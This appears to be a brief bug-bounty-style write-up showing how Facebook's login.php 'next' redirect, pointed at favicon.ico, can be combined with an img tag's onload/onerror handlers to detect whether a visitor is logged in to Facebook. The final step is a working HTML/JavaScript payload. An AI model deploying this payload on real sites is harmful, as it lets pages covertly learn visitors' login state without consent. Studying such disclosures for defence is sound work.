There are three steps for doing this bypass:
1.understand the mechanism of login redirection:
Assuming you are visiting https://www.facebook.com/bookmarks/pages
and when you give this url to the user 
https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Fbookmarks%2Fpages
the user will have two situation:
  (1.if the user have already login the facebook, it will redirect to the 
  https://www.facebook.com/bookmarks/pages#_=_
  (2.if the user has not login, it will redirect to the login page
 2.Bypassing:
 When doing this the web app of facebook will check the url's next paremeter is https://facebook.com so we just need to find 
 a piture in facebook's website.(but the pitures are stored in the fbcdn.net except favicon.ico)
 What we constrct is that 
 https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico
it is in the same orgin but it will continue redirect.
3.exploit:
<img onload="alert('logged in to fb')"onerror="alert('not logged in to fb')"
src="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico">
When user has already login the web app it will execute the javascript in onload part.
